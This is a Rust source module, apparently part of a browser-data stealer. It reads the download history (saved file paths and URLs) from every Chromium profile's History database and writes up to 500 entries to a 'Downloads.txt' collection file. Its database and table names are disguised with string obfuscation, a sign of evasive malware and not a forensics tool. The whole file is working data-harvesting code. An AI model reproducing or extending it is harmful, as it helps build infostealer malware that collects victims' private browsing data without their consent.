use crate::chromium::BrowserData;
use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Download};
use alloc::borrow::ToOwned;
use alloc::sync::Arc;
use alloc::vec::Vec;
use obfstr::obfstr as s;
use database::TableRecord;
use tasks::{parent_name, Task};
use utils::path::{Path};

const DOWNLOADS_CURRENT_PATH: usize = 2;
const DOWNLOADS_TAB_URL: usize      = 16;

pub(super) struct DownloadsTask {
    browser: Arc<BrowserData>
}

impl DownloadsTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl Task for DownloadsTask {
    parent_name!("Downloads.txt");
    
    unsafe fn run(&self, parent: &Path) {
        let Some(mut downloads) = collect_from_all_profiles(&self.browser.profiles, read_downloads) else {
            return
        };

        downloads.truncate(500);

        let _ = to_string_and_write_all(&downloads, "\n\n", parent);
    }
}

fn read_downloads(profile: &Path) -> Option<Vec<Download>> {
    let history_path = profile / s!("History");
    read_sqlite3_and_map_records(&history_path, s!("Downloads"), extract_download_from_record)
}

fn extract_download_from_record(record: &dyn TableRecord) -> Option<Download> {
    let saved_as = record.get_value(DOWNLOADS_CURRENT_PATH)?.as_string()?.to_owned();
    let url = record.get_value(DOWNLOADS_TAB_URL)?.as_string()?.to_owned();

    Some(Download {
        saved_as,
        url
    })
}